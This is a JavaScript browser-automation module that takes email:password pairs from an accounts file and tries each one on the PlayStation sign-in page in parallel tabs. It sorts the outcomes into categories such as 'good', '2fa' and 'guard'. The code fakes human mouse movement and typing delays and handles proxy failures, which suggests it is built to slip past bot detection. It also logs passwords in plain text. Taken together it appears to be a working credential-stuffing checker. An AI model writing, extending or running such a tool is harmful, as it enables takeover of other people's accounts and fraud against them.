import fs from "node:fs/promises";
import fsSync from "node:fs";
import path from "node:path";
import axios from 'axios';
import { logger } from "../utils/logger.js";
import Constants from './Constants.js';
import HumanBehavior from './HumanBehavior.js';
import FakeAccountGenerator from './FakeAccountGenerator.js';
import PageHelpers from './PageHelpers.js';

export default class AccountProcessor {
    constructor(client) {
        this.client = client;
    }

    // ==================== Real Account Processing ====================
    async processAccount(context, accountLine, tabIndex, accountsCount) {
        let page = null;
        const startTime = Date.now();

        try {
            logger.info(`🚀 Tab ${tabIndex + 1}: Starting login for ${accountLine}`);
            const email = accountLine.split(':')[0];

            // ✅ اصلاح: استفاده از page به جای ret
            page = await this._createAndLoadPage(context, tabIndex, email);

            let timeoutRetryCount = 0;
            let finalResult = null;

            while (timeoutRetryCount <= Constants.MAX_TIMEOUT_RETRIES) {
                try {
                    if (timeoutRetryCount === 0) {
                        await this._initialPageSetup(page, tabIndex);
                    } else {
                        await this._refreshPageForRetry(page, tabIndex);
                    }

                    finalResult = await this._processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount);

                    if (finalResult.shouldExit) {
                        return finalResult.result;
                    }

                    if (finalResult) break;

                } catch (retryErr) {
                    logger.error(`❌ Tab ${tabIndex + 1}: Error during retry ${timeoutRetryCount} for ${email}: ${retryErr.message}`);

                    timeoutRetryCount++;
                    if (timeoutRetryCount > Constants.MAX_TIMEOUT_RETRIES) {
                        finalResult = {
                            email,
                            status: 'timeout-error',
                            responseTime: Date.now() - startTime,
                            tabIndex,
                            retryCount: timeoutRetryCount,
                            message: 'Max timeout retries exceeded'
                        };
                        break;
                    }
                }
            }

            return finalResult;

        } catch (err) {
            logger.error(`❌ Tab ${tabIndex + 1}: Fatal error: ${err.message}`);
            return {
                email: accountLine.split(':')[0],
                status: 'error',
                error: err.message,
                responseTime: Date.now() - startTime,
                tabIndex
            };
        } finally {
            // ✅ اصلاح: اطمینان از بسته شدن صحیح صفحه
            if (page && !page.isClosed()) {
                try {
                    await page.close();
                    logger.debug(`📄 Tab ${tabIndex + 1}: Page closed successfully`);
                } catch (closeErr) {
                    logger.warn(`⚠️ Tab ${tabIndex + 1}: Error closing page: ${closeErr.message}`);
                }
            }
        }
    }

    async _createAndLoadPage(context, tabIndex, email) {
        let page = null;

        for (let attempt = 1; attempt <= Constants.MAX_RETRIES; attempt++) {
            try {
                await HumanBehavior.sleep(HumanBehavior.randomDelay(50, 250));

                // ✅ اصلاح: ایجاد صفحه جدید با مدیریت بهتر خطا
                page = await context.newPage();

                // ✅ اصلاح: تنظیم viewport با استفاده از page به جای ret
                await page.setViewportSize({
                    width: 1200 + (tabIndex * 50),
                    height: 800 + (tabIndex * 30)
                });

                logger.info(`📄 Tab ${tabIndex + 1}: Loading page (attempt ${attempt}/${Constants.MAX_RETRIES})...`);

                // ✅ بهبود: تنظیم timeout برای navigation
                await page.goto(Constants.LOGIN_URL, {
                    waitUntil: "domcontentloaded",
                    timeout: Constants.PAGE_LOAD_TIMEOUT
                });

                // ✅ بهبود: چک کردن محتوای صفحه
                const pageLoaded = await PageHelpers.waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
                if (!pageLoaded) {
                    throw new Error("Page did not load properly");
                }

                logger.info(`Tab ${tabIndex + 1}: ✅ Page loaded successfully!`);
                return page;

            } catch (gotoErr) {
                logger.error(`Tab ${tabIndex + 1}: Page load attempt ${attempt} failed: ${gotoErr.message}`);

                // ✅ اصلاح: بستن صفحه ناموفق
                if (page && !page.isClosed()) {
                    try {
                        await page.close();
                    } catch { }
                    page = null;
                }

                if (attempt >= Constants.MAX_RETRIES) {
                    logger.error(`Tab ${tabIndex + 1}: All page load attempts failed for ${email}`);
                    throw new Error('PAGE_LOAD_FAILED');
                }

                await HumanBehavior.sleep(2000 * attempt + HumanBehavior.randomDelay(250, 750));
            }
        }
    }

    async _initialPageSetup(page, tabIndex) {
        if (Constants.WAIT_FOR_FULL_LOAD) {
            logger.info(`Tab ${tabIndex + 1}: ⏱️ Additional settling time...`);
            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
        }

        await HumanBehavior.randomMouseMovements(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500) + (tabIndex * 300));
    }

    async _refreshPageForRetry(page, tabIndex) {
        logger.info(`🔄 Tab ${tabIndex + 1}: Refreshing page due to timeout (retry)...`);

        // ✅ بهبود: چک کردن وضعیت صفحه قبل از reload
        if (page.isClosed()) {
            throw new Error("Page is already closed, cannot refresh");
        }

        await page.reload({
            waitUntil: "domcontentloaded",
            timeout: 15000
        });

        const pageLoadedAfterRefresh = await PageHelpers.waitForPageContent(page, 'Sign in to PlayStation', 25000, tabIndex + 1);
        if (!pageLoadedAfterRefresh) {
            throw new Error("Page did not load properly after refresh");
        }

        logger.info(`Tab ${tabIndex + 1}: ✅ Page refreshed and loaded successfully!`);

        if (Constants.WAIT_FOR_FULL_LOAD) {
            await HumanBehavior.sleep(Constants.PAGE_SETTLE_EXTRA_MS);
        }

        await HumanBehavior.randomMouseMovements(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(750, 1500));
    }

    async _processLogin(page, accountLine, tabIndex, startTime, timeoutRetryCount, accountsCount) {
        const email = accountLine.split(':')[0];
        const submitSelector = "button[type=submit]";

        // ✅ بهبود: چک کردن وضعیت صفحه
        if (page.isClosed()) {
            throw new Error("Page is closed, cannot process login");
        }

        logger.info(`📧 Tab ${tabIndex + 1}: Processing email with copy-paste method for ${email}`);

        const emailFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="email"]', 20000);
        const emailInput = PageHelpers.emailLocator(emailFrame);

        const cutPassword = await this._humanPasteEmail(page, emailInput, accountLine);
        await PageHelpers.safeClickMayNavigate(page, emailFrame, submitSelector);

        const passFrame = await PageHelpers.waitForFrameWithSelector(page, 'input[type="password"]', 20000);
        const passInput = PageHelpers.passwordLocator(passFrame);

        logger.info(`🔑 Tab ${tabIndex + 1}: Pasting password for ${email}`);

        await HumanBehavior.sleep(HumanBehavior.randomDelay(2000, 3000) + (tabIndex * 200));

        let bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (bodyText.includes(`Sign In with Passkey`)) {
            logger.info(`🔐 Tab ${tabIndex + 1}: Passkey detected for ${email}`);
            return {
                email,
                status: 'passkey',
                responseTime: Date.now() - startTime,
                tabIndex,
                retryCount: timeoutRetryCount
            };
        }

        await this._humanPastePassword(page, passInput, cutPassword);
        await PageHelpers.safeClickMayNavigate(page, passFrame, submitSelector);

        await HumanBehavior.sleep(3000 + HumanBehavior.randomDelay(500, 1500));
        bodyText = await page.evaluate(() => document.body?.innerText || "");

        if (!bodyText) {
            await HumanBehavior.sleep(2000 + HumanBehavior.randomDelay(1000, 2000));
            bodyText = await page.evaluate(() => document.body?.innerText || "");
        }

        if (await PageHelpers._hasTimeoutMessage(bodyText) && accountsCount === tabIndex + 1) {
            logger.warn(`⏰ Tab ${tabIndex + 1}: Timeout detected for ${email}`);

            if (timeoutRetryCount >= Constants.MAX_TIMEOUT_RETRIES) {
                console.log({
                    shouldExit: true,
                    result: {
                        email,
                        status: 'timeout-error',
                        responseTime: Date.now() - startTime,
                        tabIndex,
                        retryCount: timeoutRetryCount,
                        message: 'Max timeout retries exceeded'
                    }
                });

                return {
                    shouldExit: true,
                    result: {
                        email,
                        status: 'timeout-error',
                        responseTime: Date.now() - startTime,
                        tabIndex,
                        retryCount: timeoutRetryCount,
                        message: 'Max timeout retries exceeded'
                    }
                };
            }

            throw new Error('Timeout detected, retrying...');
        }

        await PageHelpers.waitFullLoadAndSettle(page);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(1000, 2000));

        const screenshotPath = await this._takeScreenshot(page, email, tabIndex, timeoutRetryCount);
        const status = this._determineLoginStatus(bodyText);

        const responseTime = Date.now() - startTime;
        logger.info(`⏱️ Tab ${tabIndex + 1}: Processing completed in ${responseTime}ms ${timeoutRetryCount > 0 ? `(with ${timeoutRetryCount} timeout retries)` : ''}`);

        return {
            email,
            status,
            responseTime,
            tabIndex,
            screenshot: screenshotPath,
            retryCount: timeoutRetryCount,
            additionalInfo: {
                bodyTextLength: bodyText.length,
                processingTime: responseTime,
                timeoutRetries: timeoutRetryCount
            }
        };
    }

    async _takeScreenshot(page, email, tabIndex, timeoutRetryCount) {
        try {
            // ✅ بهبود: چک کردن وضعیت صفحه قبل از screenshot
            if (page.isClosed()) {
                logger.warn(`⚠️ Tab ${tabIndex + 1}: Cannot take screenshot, page is closed`);
                return null;
            }

            const filename = `${email}---tab${tabIndex}---retry${timeoutRetryCount}---${Date.now()}.png`;
            return await PageHelpers.takeAdvancedScreenshot(page, filename);
        } catch (screenshotErr) {
            logger.warn(`⚠️ Tab ${tabIndex + 1}: Screenshot failed: ${screenshotErr.message}`);
            return null;
        }
    }

    _determineLoginStatus(bodyText) {
        const statusChecks = [
            { text: 'Sign in to PlayStation', status: 'login-page' },
            { text: 'A verification code has been sent to your', status: 'good' },
            { text: 'Two-factor authentication', status: '2fa' },
            { text: 'verification code', status: '2fa' },
            { text: 'Enter the verification code', status: '2fa' },
            { text: 'Sign In with Passkey', status: 'passkey' },
            { text: `Your account has been locked.`, status: 'guard' },
            { text: `To sign in, you'll need to recover your account`, status: 'guard' },
            { text: `The sign-in ID (email address) or password you entered isn't correct`, status: 'change-pass' },
            { text: `or you might need to reset your password for security reasons.`, status: 'change-pass' },
            { text: `2-step verification is enabled`, status: 'mobile-2step' },
            { text: `Check your mobile phone for a text message with a verification code`, status: 'mobile-2step' },
            { text: `Can't connect to the server`, status: 'server-error' }
        ];

        for (const check of statusChecks) {
            if (bodyText.includes(check.text)) {
                return check.status;
            }
        }

        return 'unknown';
    }

    // ==================== Input Handling ====================
    async _humanPasteEmail(page, locator, fullAccountLine) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, `input[type="email"]`);
        await HumanBehavior.humanClick(page, `input[type="email"]`);

        console.log("📋 Pasting full account line into email field...");

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 3000));
        await locator.fill(fullAccountLine);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        const lastColonIndex = fullAccountLine.lastIndexOf(':');
        if (lastColonIndex === -1) {
            throw new Error("Invalid account format - no colon found");
        }

        const password = fullAccountLine.substring(lastColonIndex + 1);

        console.log("✂️ Step 1: Cutting password part from email field...");

        await locator.press('End', { delay: HumanBehavior.randomDelay(50, 100) });

        const passwordLength = password.length;
        for (let i = 0; i < passwordLength; i++) {
            await locator.press('Shift+ArrowLeft', { delay: HumanBehavior.randomDelay(25, 50) });
        }

        await HumanBehavior.sleep(HumanBehavior.randomDelay(150, 250));
        await locator.press('Control+x', { delay: HumanBehavior.randomDelay(100, 150) });

        console.log(`✂️ Password "${password}" cut from email field`);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(400, 600));

        console.log("🗑️ Step 2: Deleting colon (:) from email field...");
        await locator.press('Backspace', { delay: HumanBehavior.randomDelay(150, 250) });
        await HumanBehavior.sleep(HumanBehavior.randomDelay(300, 500));

        console.log("✅ Email field cleaned - only email remains");
        return password;
    }

    async _humanPastePassword(page, locator, password) {
        await locator.waitFor({ state: "visible" });

        await HumanBehavior.hoverElement(page, `input[type="password"]`);
        await HumanBehavior.humanClick(page, `input[type="password"]`);

        console.log(`📋 Pasting password: ${password}`);

        await locator.fill('');
        await HumanBehavior.sleep(HumanBehavior.randomDelay(100, 200));
        await locator.fill(password);
        await HumanBehavior.sleep(HumanBehavior.randomDelay(250, 400));

        console.log("✅ Password pasted successfully");
    }

    // ==================== File Management ====================
    static async loadAccountBatch(batchSize) {
        try {
            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
                console.log("❌ No accounts file found!");
                return [];
            }

            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
            const accounts = content
                .split("\n")
                .map(line => line.trim())
                .filter(Boolean);

            return accounts.slice(0, batchSize);
        } catch (err) {
            console.log("❌ Error loading accounts:", err.message);
            return [];
        }
    }

    static async removeProcessedAccounts(count) {
        try {
            if (!fsSync.existsSync(Constants.ACCOUNTS_FILE)) {
                return;
            }

            const content = await fs.readFile(Constants.ACCOUNTS_FILE, "utf8");
            const accounts = content
                .split("\n")
                .map(line => line.trim())
                .filter(Boolean);

            const remainingAccounts = accounts.slice(count);
            const newContent = remainingAccounts.length > 0 ? remainingAccounts.join("\n") + "\n" : "";

            await fs.writeFile(Constants.ACCOUNTS_FILE, newContent, "utf8");
            console.log(`✅ Removed ${count} processed accounts from file`);
        } catch (err) {
            console.log("❌ Error removing processed accounts:", err.message);
        }
    }

    // ==================== Results Management ====================
    static async sendResultsToServer(results) {
        try {
            console.log(`📊 Sending ${results.length} results to server...`);
            console.log(`✅ Results sent to server successfully`);

            const timestamp = new Date().toISOString();
            const logEntry = {
                timestamp,
                results,
                count: results.length
            };

            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');

        } catch (error) {
            console.log(`❌ Error sending results to server: ${error.message}`);

            const timestamp = new Date().toISOString();
            const logEntry = {
                timestamp,
                results,
                count: results.length,
                error: error.message
            };

            await fs.appendFile(Constants.RESULTS_FILE, JSON.stringify(logEntry) + '\n', 'utf8');
        }
    }

    // ==================== Error Detection ====================
    static isCriticalError(error) {
        const criticalErrors = [
            'PROXY_CONNECTION_FAILED',
            'SERVER_CONNECTION_FAILED',
            'CONTEXT_DESTROYED'
        ];

        return criticalErrors.some(criticalError =>
            error.message && error.message.includes(criticalError)
        );
    }

    static isProxyError(errorMessage) {
        const proxyErrors = [
            'net::ERR_PROXY_CONNECTION_FAILED',
            'net::ERR_TUNNEL_CONNECTION_FAILED',
            'net::ERR_CONNECTION_REFUSED',
            'Failed to determine external IP address'
        ];

        return proxyErrors.some(proxyError => errorMessage.includes(proxyError));
    }
}